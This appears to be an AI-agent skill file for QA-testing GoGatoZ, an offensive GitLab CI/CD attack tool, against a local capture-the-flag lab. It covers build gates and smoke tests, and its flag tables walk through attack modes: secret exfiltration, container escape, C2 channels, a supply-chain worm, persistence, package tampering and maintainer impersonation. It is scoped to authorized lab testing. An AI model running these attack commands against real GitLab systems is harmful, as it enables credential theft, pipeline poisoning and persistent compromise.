---
name: ctf-qa-validation
description: QA testing and validation of GoGatoZ features against the local GoGatoZ CTF lab. Invoke for post-change testing, live flag validation, lab infrastructure checks, payload smoke tests, enumerate/attack/search/pivot/notify validation, or any request to confirm that GoGatoZ still works.
---

# GoGatoZ CTF QA Validation

Use the smallest applicable tier, but always finish code changes with the full build/race/lint gate. Live CTF work is authorized only against the local lab targets documented here.

## Safety and credentials

- Work only against `http://gitlab.local:8929`, the isolated internal GitLab, and `http://127.0.0.1:31337` unless the user explicitly expands scope.
- Set `umask 077` before creating files that may contain tokens, flags, job traces, environments, artifacts, or callbacks.
- Read PATs from `~/projects/gogatoz-ctf/setup-lab.sh`; never hardcode, print, or commit them.
- `CTF_CICD_BOT_PAT`, `CTF_DEPLOY_SVC_PAT`, `CTF_ADMIN_BACKUP_PAT`, `CTF_PIVOT_SVC_PAT`, `CTF_WORM_LATERAL_PAT`, and `PAT_VALUE` are GitLab credentials. The `token` in a flagserver login JSON file is a flagserver JWT, not a GitLab PAT.
- Capture live flag values. Documentation examples can become stale and must not be treated as proof.
- Keep attack branches unique and record every changed resource so it can be restored.

Example credential loading without displaying a secret:

```bash
umask 077
eval "$(sed -n '/^CTF_CICD_BOT_PAT=/p' ~/projects/gogatoz-ctf/setup-lab.sh)"
export GL=http://gitlab.local:8929
export BOT="$CTF_CICD_BOT_PAT"
```

## Tier 1: build gate

Run before live testing to establish a baseline and again after the final edit:

```bash
cd ~/projects/gogatoz
go build -o gogatoz .
go test -race ./...
golangci-lint run -c .golangci-lint.yml ./...
```

All three commands must pass. Add focused regression tests for every bug found during live validation.

## Tier 2: non-destructive lab smoke tests

### Health

```bash
curl -sf "$GL/users/sign_in" >/dev/null
curl -sf http://127.0.0.1:31337/api/healthz | jq -e '.ok == true'
```

Do not test `/healthz`: the SPA fallback can return HTML with HTTP 200 and create a false positive.

### Search, enumerate, parse, and output formats

```bash
./gogatoz search --gitlab-url "$GL" --token "$BOT" \
  --query vuln --format json 2>/dev/null | jq -e 'length > 0'

./gogatoz enumerate --gitlab-url "$GL" --token "$BOT" \
  --target root/vuln-lotp-npm --follow-includes --format json 2>/dev/null | \
  jq -e '.[0].findings | length > 0'

printf '%s\n' root/vuln-lotp-npm | \
  ./gogatoz enumerate --gitlab-url "$GL" --token "$BOT" \
    --input - --format jsonl 2>/dev/null > /tmp/gogatoz-qa-enum.jsonl

./gogatoz parse dedup --format json < /tmp/gogatoz-qa-enum.jsonl | jq -e 'length > 0'

./gogatoz enumerate --gitlab-url "$GL" --token "$BOT" \
  --target root/vuln-lotp-npm --format sarif 2>/dev/null | \
  jq -e '.runs[0].results | length > 0'

./gogatoz enumerate --gitlab-url "$GL" --token "$BOT" \
  --target root/vuln-lotp-npm --format glsast 2>/dev/null | \
  jq -e '.vulnerabilities | length > 0'
```

Enumerate accepts repeatable `--target/-t` and `--input`; it does not accept `--project`. Finding identifiers are in `.id`, not `.rule`.

### Payload generation

Parse the whole output as YAML. Do not use `head | grep`: valid payloads such as dependency-confusion and runner-variable-dump need not place `stages:`, `include:`, or `workflow:` in the first lines.

```bash
payloads='secrets ror-shell cache-poison git-hook memory-dump supplychain-worm container-escape c2-channel nested-runner'
for payload in $payloads; do
  ./gogatoz attack --payload-only --payload "$payload" 2>/dev/null | \
    ruby -ryaml -e 'YAML.parse_stream(STDIN.read)' || exit 1
done

expansion='remote-include-cache workflow-vars spec-inputs rules-bypass interruptible oidc-federation artifact-reports image-poison parallel-matrix pre-get-sources cache-key-poison trigger-artifact needs-project job-token-push'
for payload in $expansion; do
  ./gogatoz attack --payload-only --payload "$payload" 2>/dev/null | \
    ruby -ryaml -e 'YAML.parse_stream(STDIN.read)' || exit 1
done
```

Flags 35–47 use the first 13 expansion payloads. `job-token-push` is a fourteenth supported payload and must remain in smoke coverage even though it is not one of those 13 flags.

### Other read-only smoke tests

```bash
./gogatoz attack --gitlab-url "$GL" --token "$BOT" \
  --target root/vuln --discover-tags

./gogatoz pivot --gitlab-url "$GL" --token "$BOT" \
  -t root/ctf-pivot-gateway --listen :9443 \
  --external-url http://127.0.0.1:9443 --max-depth 1 --dry-run

./gogatoz bloodhound export --input /tmp/gogatoz-qa-enum.jsonl \
  --output /tmp/gogatoz-qa-bloodhound.zip
unzip -l /tmp/gogatoz-qa-bloodhound.zip

./gogatoz explain VARIABLE_INJECTION
./gogatoz explain SELF_HOSTED_EXPOSED
```

BloodHound export takes enumerate JSONL through `--input`. GoGatoZ has no `bloodhound upload`, `bloodhound query`, or `--session latest` commands.

Notify dry-run example:

```bash
./gogatoz enumerate --gitlab-url "$GL" --token "$BOT" \
  --target root/vuln-lotp-npm --format jsonl 2>/dev/null | \
  ./gogatoz notify --dry-run \
    --discord-webhook http://example.invalid/webhook 2>&1 | head -20
```

## Tier 3: challenge validation

Read the matching walkthrough before running a destructive feature. A flag is solved only when the intended behavior is verified, the live value is captured from the resulting callback/artifact/state, and the changed state is restored.

### Core track, Flags 1–20

Use Lab 9.7's main chain in order:

| Flags | Intended validation |
|---|---|
| 1–7 | Public-repo discovery, artifact secret exfiltration, lateral credentials, protected-variable bypass, admin reach, history scanning, and opsec chain |
| 8 | `--inject-script`; verify the workflow hop |
| 9 | Cache poisoning; verify shared-key consumer execution |
| 10 | `--auto-merge`; verify approval/merge behavior and remove the MR branch |
| 11–13 | `pivot` depth 0–2; verify each callback hop, not only the final secret |
| 14 | Search/enumerate through both no-auth and authenticated SOCKS5 proxies |
| 15 | Tag poisoning with all required tag parameters; restore the original tag and default branch state |
| 16–20 | LOTP npm, tool/config execution, OIDC/MR, trigger-chain, and cache-key techniques; preserve and restore the original CI file |

### Advanced and orphan modes, Flags 21–34

| Flag | Target | Intended GoGatoZ path and proof |
|---:|---|---|
| 21 | `root/ctf-ror-exposure` | `--ror-listen`, external bind/address, `shell_executor`; callback environment received |
| 22 | `root/vuln-memory-dump` | `--memory-dump`; inspect memory/environment bundle artifacts |
| 23 | `worm-labs/vuln-worm` | `--supply-chain-worm --worm-target-group worm-labs --worm-max-repos 4 --webhook ...`; target plus four sibling callbacks |
| 24 | `root/vuln-escape` | `--container-escape --tags docker --escape-method bind-mount`; verify host output through privileged DinD |
| 25 | `root/vuln-var-inject` | `--variable-inject --inject-scope project`; requires Maintainer; verify and delete probe variable, then artifact exfil |
| 26 | `root/vuln-c2` | `--c2-channel`; verify encoded DNS chunks, optional callback, and retained artifact |
| 27 | dependency leaf/middle/crown | enumerate JSONL → `bloodhound export --input`; verify graph nodes/edges, then crown artifact exfil |
| 28 | `root/vuln-nested-runner` | create owned temporary project/runner, use `--payload nested-runner`, execute C2 job, then remove runner/process/config/project |
| 29 | `root/worm-crown` | use the lateral token recovered by Flag 23; verify crown artifact |
| 30 | `root/vuln-workflow-exfil` | `--workflow-exfil`; verify disguised artifact job |
| 31 | `root/vuln-commit-prefix` | `--commit-prefix`; preserve existing CI and verify the release job artifact |
| 32 | `root/vuln-release-pipeline` | `--release-tamper-pipeline`; verify signing/release artifact |
| 33 | `root/vuln-dep-confusion` | enumerate finding `.id`, then `--dep-confusion`; use the configured lab registry, not public npm |
| 34 | `root/vuln-runner-var-dump` | `--runner-var-dump`; verify sensitive-variable artifact |

ROR callback guidance:

```bash
./gogatoz attack --ror-listen --target root/ctf-ror-exposure \
  --ror-listen-addr 0.0.0.0:9444 \
  --webhook http://host.docker.internal:9444 \
  --tags shell_executor --branch gogatoz-qa-flag21
```

The callback base can include or omit `/callback`; GoGatoZ normalizes it. The worm listener uses its own `/exfil` path and counts the initial target in addition to promoted siblings. Skip projects marked for deletion during propagation.

### Expansion track, Flags 35–47

| Flag | Target | Payload |
|---:|---|---|
| 35 | `root/shared-ci-templates` | `remote-include-cache` |
| 36 | `root/monorepo-platform` | `workflow-vars` |
| 37 | `root/component-library` | `spec-inputs` |
| 38 | `root/secure-pipeline` | `rules-bypass` |
| 39 | `root/deploy-orchestrator` | `interruptible` |
| 40 | `root/cloud-deployer` | `oidc-federation` |
| 41 | `root/compliance-scanner` | `artifact-reports` |
| 42 | `root/microservice-build` | `image-poison` |
| 43 | `root/load-test-runner` | `parallel-matrix` |
| 44 | `root/bootstrap-runner` | `pre-get-sources` |
| 45 | `root/build-cache-manager` | `cache-key-poison` |
| 46 | `root/release-orchestrator` | `trigger-artifact` |
| 47 | `root/shared-artifacts` | `needs-project` |

Generate each payload first, parse it as YAML, then commit it with `--commit-ci --payload <name>` on a unique branch. Flag 43 expands to multiple matrix jobs; verify every expected job/artifact. GitLab CE does not mint the Premium/Ultimate OIDC token used by Flag 40, so validate the OIDC YAML/finding and use artifact-based environment capture for the lab flag.

### Offensive track, Flags 48–54

| Flag | Target | Intended path and required restoration |
|---:|---|---|
| 48 | `root/release-dashboard` | `--tamper-release`; update the existing asset link in place, verify, then restore the original URL |
| 49 | `root/artifact-registry` | `--tamper-package`; upload bytes with the exact original basename (`app.bin`), verify, then restore original bytes |
| 50 | `root/frontend-toolkit` | `--npm-tamper`; verify lifecycle-hook execution and `tampered-package.json`; tokenless mode operates on the checked-out package |
| 51 | `root/monitoring-agent` | `--dead-man-switch`; default monitor URL must use configured GitLab; verify persistence files, then remove every file/process |
| 52 | `root/multi-branch-app` | `--branch-mutator`; record original CI on every selected unprotected branch, verify poisoned jobs, then restore exact bytes |
| 53 | `root/signed-releases` | `--sigstore`; validate the DSSE bundle/predicate and retain public evidence before temporary signing material is removed |
| 54 | `root/code-review-gate` | `--secrets --impersonate-maintainer`; commit author and `CI_COMMIT_AUTHOR` must match a visible Maintainer/Owner |

`--impersonate-maintainer` must use `/members/all` so inherited maintainers are visible. It must fail when no maintainer/owner is visible; silently falling back to a lower role is not valid proof.

## Artifact and pipeline verification

Creating a branch can trigger an initial pipeline on the inherited CI before the payload commit. Select the pipeline by both ref and payload commit SHA, or by the expected job name:

```bash
encoded_project='root%2Fexample'
branch='gogatoz-qa'
sha=$(curl -sf -H "PRIVATE-TOKEN: $BOT" \
  "$GL/api/v4/projects/$encoded_project/repository/branches/$branch" | jq -r '.commit.id')

curl -sfG -H "PRIVATE-TOKEN: $BOT" \
  --data-urlencode "ref=$branch" --data-urlencode "sha=$sha" \
  "$GL/api/v4/projects/$encoded_project/pipelines"
```

Do not assume `.[0]` is the payload pipeline. Wait for its expected job to reach a terminal state.

Artifacts may contain plain `KEY=value`, JSON, base64-wrapped environments, nested ZIPs, or tarballs. List the archive first, extract into a mode-700 temporary directory, decode only the relevant file, and never print the complete environment. Confirm captured flags without echoing them.

Secrets mode uses `--exfil-method artifact`, not `--method artifact`:

```bash
./gogatoz attack --gitlab-url "$GL" --token "$BOT" \
  --target root/vuln-lotp-npm --secrets \
  --exfil-method artifact --branch gogatoz-qa-secrets
```

## Flagserver validation

Correct endpoints:

- `POST /api/auth/register` or `/api/auth/login` with `{"name":"...","password":"..."}`
- `POST /api/submit` with `{"flag":"..."}` and `Authorization: Bearer <JWT>`
- `GET /api/flags/progress` with the same JWT
- `GET /api/scoreboard` is public

The per-team limiter is `10/60` tokens per second with burst 3. Three immediate submissions can succeed; sustained submissions need slightly more than six seconds between requests. HTTP 429 is JSON, not an empty response. Retry it after waiting without discarding the flag.

```bash
for id in $(seq 1 54); do
  flag=$(awk -F '\t' -v wanted="$id" '$1 == wanted {print $2}' captured.tsv)
  while true; do
    code=$(curl -sS -o response.json -w '%{http_code}' \
      -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
      --data "$(jq -cn --arg flag "$flag" '{flag:$flag}')" \
      http://127.0.0.1:31337/api/submit)
    [ "$code" = 429 ] && { sleep 7; continue; }
    [ "$code" = 200 ] && jq -e '.correct == true' response.json >/dev/null || exit 1
    break
  done
  sleep 6.2
done
```

There are 54 flags. Final proof is progress showing 54 solved, not merely 54 local strings.

## Cleanup and state restoration

For a normal attack branch, erase traces before deleting the branch:

```bash
./gogatoz attack --gitlab-url "$GL" --token "$ADMIN" \
  --target <project> --cleanup --cleanup-jobs \
  --cleanup-jobs-ref <branch> --cleanup-jobs-delete

./gogatoz attack --gitlab-url "$GL" --token "$ADMIN" \
  --target <project> --cleanup --cleanup-branch <branch>
```

`--cleanup-branch` is the deletion flag; `--branch` only selects a working branch. Deleting a pipeline can remove its jobs even when GitLab returns 403 for an individual job erase.

Also perform technique-specific restoration:

- delete variable-injection probes;
- restore poisoned tags, release links, package bytes, and every branch-mutator CI file exactly;
- remove DMS persistence, nested-runner processes/binaries/configuration and runner records;
- delete or schedule temporary projects for deletion;
- stop callback servers and remove local flag/artifact files securely;
- verify no test branch prefix remains across all visible CTF projects.

Never overwrite a protected/default branch during cleanup. `--deconflict force` reuses an existing branch; it must not delete/recreate that branch as a side effect.

## Setup-script changes

If validation exposes a lab defect, fix `~/projects/gogatoz-ctf/setup-lab.sh` and rerun it to prove idempotence. Variable injection requires Maintainer (`access_level: 40`), not Developer. A flagserver environment change requires recreating the container because a restart does not reload Compose environment values.

## Pass criteria

| Area | Pass condition |
|---|---|
| Build | build, full race suite, and golangci-lint all pass |
| Smoke | health, search, enumerate, formats, parse, and every payload parse successfully |
| Challenges | intended behavior and live flag verified for all in-scope flags |
| Submission | `/api/flags/progress` reports all 54 solved |
| Cleanup | original GitLab state restored; no attack branches, active temporary runners, probes, or persistence remain |

## Reference paths

| Resource | Path |
|---|---|
| GoGatoZ | `~/projects/gogatoz` |
| CTF lab | `~/projects/gogatoz-ctf` |
| Setup/flag definitions | `~/projects/gogatoz-ctf/setup-lab.sh` |
| Course docs | `~/projects/hackers-guide-to-cicd` |
| Walkthroughs | `~/projects/hackers-guide-to-cicd/a-hackers-guide-to-cicd/src/content/docs/labs/gitlab-exploitation/` |
